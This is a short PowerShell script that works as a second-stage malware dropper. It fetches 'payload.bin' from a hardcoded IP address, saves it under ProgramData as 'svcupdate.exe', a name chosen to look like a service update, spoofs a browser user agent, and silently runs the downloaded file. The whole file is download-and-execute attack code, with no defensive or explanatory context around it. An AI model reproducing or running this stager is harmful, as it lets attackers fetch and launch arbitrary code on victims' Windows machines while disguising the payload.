
[CmdletBinding()]
param(
    [string]$TargetUrl = "http://198.51.100.105/downloads/payload.bin",
    [string]$PayloadPath = 'C:\ProgramData\svcupdate.exe',
    [int]$ConnectionTimeout = 11,
    [string]$UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
)
$ErrorActionPreference = "Stop"

function Get-Stage2Payload {
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45,
        [string]$UserAgent = "Mozilla/5.0"
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$ResultObject = Get-Stage2Payload -SourceUrl $TargetUrl -DestinationPath $PayloadPath -TimeoutSec $ConnectionTimeout -UserAgent $UserAgent
if ($ResultObject) {
    Start-Process -FilePath $PayloadPath -ErrorAction SilentlyContinue
}

Set-Location -Path $env:TEMP
Write-Output "stage 12 initialized"
